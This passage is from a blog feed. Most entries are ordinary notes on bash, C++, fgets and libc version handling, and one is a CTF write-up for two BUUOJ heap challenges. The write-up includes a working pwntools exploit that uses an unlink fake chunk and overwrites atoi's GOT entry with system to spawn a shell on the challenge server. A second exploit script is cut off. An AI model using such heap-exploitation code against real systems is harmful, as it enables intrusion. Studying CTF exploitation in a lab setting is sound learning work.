string\">\"<span class=\"token variable\">$obj</span>\"</span> <span class=\"token operator\">!=</span> <span class=\"token string\">\"quit\"</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$obj</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr></table></figure><h3 id=\"判断文件是否存在\"><a class=\"markdownIt-Anchor\" href=\"#判断文件是否存在\">#</a> 判断文件是否存在：</h3>\n<pre><code> if [ -f 文件路径 ]\n</code></pre>\n<h1 id=\"变量\"><a class=\"markdownIt-Anchor\" href=\"#变量\">#</a> 变量</h1>\n<h2 id=\"基础\"><a class=\"markdownIt-Anchor\" href=\"#基础\">#</a> 基础</h2>\n<h3 id=\"定义\"><a class=\"markdownIt-Anchor\" href=\"#定义\">#</a> 定义</h3>\n<p>变量名 = 值</p>\n<p>等号两边<strong>不</strong>能有<strong>空格</strong>。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">a</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr></table></figure><h3 id=\"引用\"><a class=\"markdownIt-Anchor\" href=\"#引用\">#</a> 引用</h3>\n<p>引用变量时前面需加上 <code>$</code> ，定义时不需要。</p>\n<p>变量名称两端可以选择加 <code>&#123;&#125;</code> ，在不需要空格的时候</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$&#123;a&#125;</span></pre></td></tr></table></figure><h2 id=\"字符串\"><a class=\"markdownIt-Anchor\" href=\"#字符串\">#</a> 字符串</h2>\n<p>强制保留原格式：使用<strong>单引号</strong>。</p>\n<p>所有内容都会原封不动输出，不能含有单引号，不会将形如 <code>$&#123;&#125;</code>  的内容转换为变量。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">str</span><span class=\"token operator\">=</span><span class=\"token string\">'You can use $&#123;name&#125; to print name'</span></pre></td></tr></table></figure><p>格式化输出：使用<strong>双引号</strong>。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">str</span><span class=\"token operator\">=</span><span class=\"token string\">\"hello, <span class=\"token variable\">$&#123;name&#125;</span>\"</span></pre></td></tr></table></figure><h3 id=\"获取字符串长度\"><a class=\"markdownIt-Anchor\" href=\"#获取字符串长度\">#</a> 获取字符串长度</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">string</span><span class=\"token operator\">=</span><span class=\"token string\">\"abcd\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">echo</span> $</pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/c-%E4%B8%AD%E7%9F%A5%E8%AF%86%E6%94%B6%E8%97%8F/",
            "url": "http://waltcsz.github.io/2023/11/c-%E4%B8%AD%E7%9F%A5%E8%AF%86%E6%94%B6%E8%97%8F/",
            "title": "C++中知识收藏",
            "date_published": "2023-11-15T03:02:38.000Z",
            "content_html": "<h1 id=\"作用域\"><a class=\"markdownIt-Anchor\" href=\"#作用域\">#</a> 作用域</h1>\n<h2 id=\"命名空间\"><a class=\"markdownIt-Anchor\" href=\"#命名空间\">#</a> 命名空间</h2>\n<pre><code class=\"language-c++\">namespace namespace_name &#123;\n   // 代码声明\n&#125;\n</code></pre>\n<p>引用命名空间内的变量。</p>\n<pre><code class=\"language-c++\">namespace_name::code;\n</code></pre>\n<h3 id=\"导入命名空间\"><a class=\"markdownIt-Anchor\" href=\"#导入命名空间\">#</a> 导入命名空间</h3>\n<p>使得后续代码在引用该命名空间时无需添加前缀。</p>\n<ul>\n<li>导入整个命名空间</li>\n</ul>\n<pre><code class=\"language-c++\">using namespace namespace_name;\n</code></pre>\n<ul>\n<li>仅导入命名空间部分变量或方法。</li>\n</ul>\n<pre><code class=\"language-c++\">using std::cout;\n</code></pre>\n<h3 id=\"嵌套的命名空间\"><a class=\"markdownIt-Anchor\" href=\"#嵌套的命名空间\">#</a> 嵌套的命名空间</h3>\n<p>命名空间可以嵌套，可以在一个命名空间中定义另一个命名空间。</p>\n<pre><code class=\"language-c++\">namespace namespace_name1 &#123;\n\t// 代码声明   \n\tnamespace namespace_name2 &#123;\n\t\t// 代码声明   \n\t&#125;\n&#125;\n</code></pre>\n<p>可以通过使用 <strong>::</strong> 运算符来访问嵌套的命名空间中的成员：</p>\n<pre><code class=\"language-c++\">// 访问 namespace_name2 中的成员\nusing namespace namespace_name1::namespace_name2;\n// 访问 namespace_name1 中的成员\nusing namespace namespace_name1;\n</code></pre>\n<h2 id=\"作用域解析运算符\"><a class=\"markdownIt-Anchor\" href=\"#作用域解析运算符\">#</a> 作用域解析运算符</h2>\n<p><code>::</code>  为作用域解析运算符。</p>\n<h3 id=\"用途\"><a class=\"markdownIt-Anchor\" href=\"#用途\">#</a> 用途</h3>\n<h4 id=\"命名空间的函数或类型\"><a class=\"markdownIt-Anchor\" href=\"#命名空间的函数或类型\">#</a> 命名空间的函数或类型</h4>\n<p>如上</p>\n<h4 id=\"类的属性或方法\"><a class=\"markdownIt-Anchor\" href=\"#类的属性或方法\">#</a> 类的属性或方法</h4>\n<p>如同 python 内的 <code>.</code> 。</p>\n<pre><code class=\"language-c++\">class Test &#123;\n    Test();\n&#125;;\n\nTest::Test() \n&#123;\n&#125;\n</code></pre>\n<h4 id=\"全局作用域\"><a class=\"markdownIt-Anchor\" href=\"#全局作用域\">#</a> 全局作用域</h4>\n<p>单独的 <code>::</code>  放在函数或变量前，表示调用全局的函数或变量。这在局部也存在同名函数或变量时很有用。</p>\n<pre><code class=\"language-c++\">::s;\t// 全局变量\ns;\t\t// 局部变量\n</code></pre>\n<h1 id=\"函数\"><a class=\"markdownIt-Anchor\" href=\"#函数\">#</a> 函数</h1>\n<h2 id=\"字符串\"><a class=\"markdownIt-Anchor\" href=\"#字符串\">#</a> 字符串</h2>\n<h3 id=\"isprint\"><a class=\"markdownIt-Anchor\" href=\"#isprint\">#</a> isprint()</h3>\n<p>检查字符是否为可打印字符。是则返回 true，否则返回 false。</p>\n<pre><code class=\"language-c++\">int isprint(int c);\n</code></pre>\n<h3 id=\"strdup\"><a class=\"markdownIt-Anchor\" href=\"#strdup\">#</a> strdup()</h3>\n<p>分配块，然后复制字符串到块中，返回块地址。</p>\n<p>可用 free () 释放内存。</p>\n<h3 id=\"strtok\"><a class=\"markdownIt-Anchor\" href=\"#strtok\">#</a> strtok()</h3>\n<p>拆分字符串，</p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/inputanalyse/",
            "url": "http://waltcsz.github.io/2023/11/inputanalyse/",
            "title": "inputAnalyse",
            "date_published": "2023-11-07T13:55:24.000Z",
            "content_html": "<h2 id=\"fgets\"><a class=\"markdownIt-Anchor\" href=\"#fgets\">#</a> fgets</h2>\n<h3 id=\"空字符\"><a class=\"markdownIt-Anchor\" href=\"#空字符\">#</a> 空字符</h3>\n<p>遇到字符 <code>'\\0'</code>  不会停止。</p>\n<h3 id=\"截止\"><a class=\"markdownIt-Anchor\" href=\"#截止\">#</a> 截止</h3>\n<p>任意空字符停止输入，否则等待直到有新字符。</p>\n<p>其中会将该空字符输入。最后在其后添加字符 <code>'\\0'</code> 。</p>\n<h2 id=\"上限\"><a class=\"markdownIt-Anchor\" href=\"#上限\">#</a> 上限</h2>\n<p>会预留一个字符给字符 <code>'\\0'</code> ，若输入数超过上限，则直接结束输入，在最后添加字符 <code>'\\0'</code> 。</p>\n<p>同时会舍弃空字符前面的其他未输入字符。</p>\n<p>即若允许输入 18 个字符，则最多输入 17 字符。若输入 20 个字符，截断至 17 个字符，然后舍弃最后 3 个，然后添加字符 <code>'\\0'</code> 。</p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/findlibc/",
            "url": "http://waltcsz.github.io/2023/11/findlibc/",
            "title": "findLibc",
            "date_published": "2023-11-06T09:27:29.000Z",
            "content_html": "<h1 id=\"libc应用\"><a class=\"markdownIt-Anchor\" href=\"#libc应用\">#</a> libc 应用</h1>\n<h2 id=\"libc修补\"><a class=\"markdownIt-Anchor\" href=\"#libc修补\">#</a> libc 修补</h2>\n<p>由于靶机运行环境与本地机器环境可能不同，会导致程序实现的方式有所差异。</p>\n<p>尤其是对于堆题而言，不同版本有不同的检测机制以及 tcache 的有无和截然不同的安全检测。使得 libc 的修正变得十分重要。</p>\n<p>目前主要有以下几种方法实现 libc 的修正。</p>\n<ol>\n<li>使用 patchelf 修改 elf 文件的依赖</li>\n<li>pwntools 中利用 process 指定 libc 版本。</li>\n<li>在 docker 容器中运行和调试</li>\n</ol>\n<h3 id=\"patchelf修改libc\"><a class=\"markdownIt-Anchor\" href=\"#patchelf修改libc\">#</a> patchelf 修改 libc</h3>\n<blockquote>\n<p>该方式会<strong>修改文件本身</strong>，尽量先对文件进行<strong>备份</strong>。主要会修改文件内依赖的地址，可能造成文件内部分数据的地址出现偏移。</p>\n</blockquote>\n<p>利用 <code>patchelf</code>  或者 <code>process([&quot;/path/to/ld.so&quot;, &quot;./test&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/path/to/libc.so.6&quot;&#125;)</code>  指定 libc 版本运行。</p>\n<h4 id=\"how-to-run-in-custom-libc-version\"><a class=\"markdownIt-Anchor\" href=\"#how-to-run-in-custom-libc-version\">#</a> How to run in custom libc version?</h4>\n<pre><code>cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so\npatchelf --set-interpreter /tmp/ld-2.27.so ./test\nLD_PRELOAD=./libc.so.6 ./test\n</code></pre>\n<h3 id=\"pwntools指定libc\"><a class=\"markdownIt-Anchor\" href=\"#pwntools指定libc\">#</a> pwntools 指定 libc</h3>\n<pre><code>from pwn import *\np = process([&quot;/path/to/ld.so&quot;, &quot;./test&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/path/to/libc.so.6&quot;&#125;)\n</code></pre>\n<p>具体参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NreXNpZGVyL3B3bmRvY2tlcg==\">https://github.com/skysider/pwndocker</span></p>\n<h2 id=\"查找libc\"><a class=\"markdownIt-Anchor\" href=\"#查找libc\">#</a> 查找 libc</h2>\n<h3 id=\"利用glibc-all-in-one\"><a class=\"markdownIt-Anchor\" href=\"#利用glibc-all-in-one\">#</a> 利用 glibc-all-in-one</h3>\n<p>只能查到每个大版本内的初始版本和最新版本</p>\n<h3 id=\"利用官网\"><a class=\"markdownIt-Anchor\" href=\"#利用官网\">#</a> 利用官网</h3>\n<p>拥有最全的版本</p>\n<p>如 buuoj 一般使用 <code>libc6_2.23-0ubuntu10_*</code>  的版本作为题目的 libc 库，该版本无法在 glibc-all-in-one 中下载。</p>\n<p>在官网找到 libc 后进行解包。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dpkg-deb <span class=\"token parameter variable\">-x</span> libc6_2.23-0ubuntu10_amd64.deb ./libc</pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYXVuY2hwYWQubmV0L3VidW50dS8rc291cmNlL2dsaWJjLytwdWJsaXNoaW5naGlzdG9yeQ==\">libc 历史版本</span></p>\n<h2 id=\"ubuntu对应libc版本\"><a class=\"markdownIt-Anchor\" href=\"#ubuntu对应libc版本\">#</a> ubuntu 对应 libc 版本</h2>\n<table>\n<thead>\n<tr>\n<th>ubuntu</th>\n<th>libc</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>16.04</td>\n<td>2.23</td>\n</tr>\n<tr>\n<td>18.04</td>\n<td>2.27</td>\n</tr>\n<tr>\n<td>19</td>\n<td>2.29</td>\n</tr>\n<tr>\n<td>20.04</td>\n<td>2.30</td>\n</tr>\n<tr>\n<td>22.04</td>\n<td>2.37</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/11/buu-1106/",
            "url": "http://waltcsz.github.io/2023/11/buu-1106/",
            "title": "buu 1106",
            "date_published": "2023-11-06T08:07:06.000Z",
            "content_html": "<h2 id=\"zjctf-2019easyheap\"><a class=\"markdownIt-Anchor\" href=\"#zjctf-2019easyheap\">#</a> [ZJCTF 2019]EasyHeap</h2>\n<p>heap, unlink, overlap</p>\n<p>用数组储存堆地址。利用 unlink 将地址指向数组，即可实现任意地址读写。</p>\n<p>unlink 修改的堆地址应该为真实地址，而 malloc 返回的地址为用户地址。所以伪造的 fakechunk 要在当前块的头部紧接着的地方。例如：</p>\n<p>数组储存的某个块的地址为 0x5010，则该处应为 chunk 的头，所以直接将 fakechunk 输入至 chunk 中。addr 为数组上储存 0x5010 处的地址。unlink 后 addr 指向 addr-0x18，即数组下标小 3 的位置。</p>\n<table>\n<thead>\n<tr>\n<th>地址</th>\n<th>0x0</th>\n<th>0x8</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0x5000</td>\n<td>0</td>\n<td>0xa1</td>\n<td>chunk 开始</td>\n</tr>\n<tr>\n<td>0x5010</td>\n<td>0</td>\n<td>0x91</td>\n<td>fakechunk 开始</td>\n</tr>\n<tr>\n<td>0x5020</td>\n<td>addr-0x18</td>\n<td>addr-0x10</td>\n<td></td>\n</tr>\n<tr>\n<td>0x5030</td>\n<td>*</td>\n<td>*</td>\n<td></td>\n</tr>\n<tr>\n<td>*</td>\n<td>*</td>\n<td>*</td>\n<td></td>\n</tr>\n<tr>\n<td>0x50</td>\n<td>0</td>\n<td>0x90</td>\n<td>下一 chunk 覆盖 inuse 位</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'./easyheap'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libdir <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span>libdir <span class=\"token operator\">+</span> <span class=\"token string\">'libc-2.23.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./\"</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28311</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x400c8c'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size of Heap :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content of heap:'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size of Heap : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content of heap : '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>heaparray <span class=\"token operator\">=</span> <span class=\"token number\">0x6020E0</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>atoi_g <span class=\"token operator\">=</span> <span class=\"token number\">0x602068</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>system_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0xa8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#size 0xb0 #3</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'end'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xa1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>heaparray <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>heaparray <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>atoi_g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>system_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice :'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"hitcontraining_heapcreator\"><a class=\"markdownIt-Anchor\" href=\"#hitcontraining_heapcreator\">#</a> hitcontraining_heapcreator</h2>\n<p>off_by_one, UAF, overlap</p>\n<p>可写 got 表。</p>\n<p>单字节溢出覆盖下一 chunk 修改其大小，造成堆块重叠。</p>\n<p>程序采用固定分配一个 0x10 大小的块来管理用户需要的块的方法，该块前 8 字节储存用户块大小，后 10 字节储存用户块地址。因此调整堆块分配，使得其中一个用户块 ra 与一个管理块 hb 重叠，对 ra 的读写操作可以控制 hb 的数据，由此实现任意地址读写。</p>\n<p>最后泄露 got 表上 free 的真实地址获取 libc 版本。然后修改 free 的真实地址为 system 地址。释放含 <code>/bin/sh\\0</code>  的块，实现 getshell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token 